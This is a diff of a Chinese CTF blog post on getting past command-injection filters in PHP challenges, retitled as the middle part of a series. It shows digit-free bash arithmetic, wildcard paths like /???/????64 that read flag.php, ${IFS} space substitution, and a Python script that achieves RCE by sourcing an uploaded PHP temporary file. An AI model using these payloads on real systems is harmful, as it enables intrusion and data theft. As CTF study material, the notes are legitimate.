@@ -22,7 +22,7 @@
 
   
 
-  <title>代码执行的各种过滤绕过-下篇 | Baron&#39;s Blog</title>
+  <title>代码执行的各种过滤绕过-中篇 | Baron&#39;s Blog</title>
 
   
 
@@ -102,7 +102,7 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">代码执行的各种过滤绕过-下篇</h1>
+          <h1 class="title-wrap">代码执行的各种过滤绕过-中篇</h1>
           <h2 class="title-sub-wrap">
             <strong>Baron</strong>
             <span>发布于</span>
@@ -111,7 +111,7 @@
           
             <h2 class="last-time">
               <span>最后更新于</span>
-              <time  class="article-updated" datetime="2023-10-27T08:25:18.516Z" itemprop="dateUpdated">2023-10-27</time>
+              <time  class="article-updated" datetime="2023-10-27T13:48:44.520Z" itemprop="dateUpdated">2023-10-27</time>
             </h2>
           
           
@@ -206,6 +206,27 @@
 <p>a&#x3D;123;</p>
 <p>系统变量</p>
 <p>$HOME，${HOME}</p>
+<p>变量调用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">num1=12;num2=23;all=$(($num1+$num2));echo $all;</span><br><span class="line">a=$((++notdefined));echo $a;//可以构造一个 数字 1</span><br><span class="line">echo $(());//得到数字0</span><br><span class="line">echo $((~$(())));//得到数字-1   理解：如果b=~a，那么a+b=-1</span><br><span class="line">echo $(( $((~$(()))) $((~$(()))) ));//直接放到一起，默认加法</span><br><span class="line">若得到36--&gt;-37</span><br><span class="line">先得到-37</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(( $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(())))));</span></span><br><span class="line">echo $(( $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(())))));</span><br><span class="line">再得到36</span><br><span class="line">echo $((~$(( $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(())))))));</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x08&gt;</strong> 问号匹配命令进行命令执行</p>
+<h6 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h6><p>bin&#x2F;base64</p>
+<p>可以匹配到&#x2F;bin目录下的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</span><br></pre></td></tr></table></figure>
+
+<p>我们知道了base64，可以用通配符进行匹配命令执行进行查看flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64 flag.php</span><br><span class="line">意思/bin/base64 flag.php</span><br><span class="line">?c=/???/????64 ????.???</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h6><p>&#x2F;usr&#x2F;bin&#x2F;bzip2</p>
+<p>可以匹配到&#x2F;usr&#x2F;bin目录下的内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wge</span><br></pre></td></tr></table></figure>
+
+<p>下面是尝试的payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/???/????2 ????.???</span><br></pre></td></tr></table></figure>
+
+<p>最后访问 &#x2F;flag.php.bz2进行下载压缩包</p>
 <h5 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h5><p>替换空格</p>
 <p>GET:</p>
 <p>url编码类：%09，%20？？好像%26也可以？</p>
@@ -216,6 +237,25 @@
 <p>$HOME，$</p>
 <p>变量调用</p>
 <p>a&#x3D;123;echo $a;echo $a;</p>
+<p>ls的用法</p>
+<p><img src="/../images/image-20231027191134346.png" alt="image-20231027191134346"></p>
+<p><strong>php临时文件上传</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/183046">PHP临时文件机制与利用的思考-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p><strong>0x09&gt;</strong> 临时文件上传RCE</p>
+<p>利用的是PHP，默认会接收POST请求，并临时保存文件到服务器的&#x2F;tmp目录中，这个目录也可以在php.ini中进行修改。</p>
+<p>具体原理：</p>
+<p>利用 source 命令，或者说是 . 命令去执行我们上传的临时文件</p>
+<p>利用前提肯定是我们得要有一个可以执行命令的接口，然后再利用临时文件，去执行临时文件中的命令。可以用在我们命令执行的位置存在WAF，对我们的命令执行有限制的接口。</p>
+<p>这里直接上python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://80f8239f-d1d3-4365-8b48-12adf22459fe.chall.ctf.show/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">翻开ascii码表，可见大写字母位于@与[之间：，我们可以利用[@-[]来表示大写字母：</span><br></pre></td></tr></table></figure>
+
+
+
+<p>不知道的姿势</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;_&#125; =<span class="string">&quot;&quot;</span> //返回上一次命令</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">((<span class="variable">$&#123;_&#125;</span>))=0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">((~$((<span class="variable">$&#123;_&#125;</span>))))=-1</span></span><br><span class="line">其他姿势</span><br><span class="line"></span><br><span class="line">?c=grep$&#123;IFS&#125;&#x27;fla&#x27;$&#123;IFS&#125;fla??php</span><br></pre></td></tr></table></figure>
+
 
       </section>
 
